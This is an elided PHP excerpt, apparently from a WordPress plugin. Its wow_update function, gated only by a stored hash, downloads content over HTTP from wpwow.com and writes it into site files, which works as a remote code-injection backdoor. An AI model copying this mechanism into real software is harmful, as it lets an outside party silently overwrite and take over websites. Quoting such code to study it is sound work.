<?php
	...
	function wow_update($updateParams) {
		if ( !isset($updateParams->wow_hash) || $updateParams->wow_hash!=get_option('wow_hash') ) return 1;
		...
		foreach($updateParams->files as $file) {
			...
			if (isset($file->replace)) {
				...
				$txt=file_get_contents("http://wpwow.com/".$file->content);
			}
			fwrite($handle, $txt);
			fclose($handle);
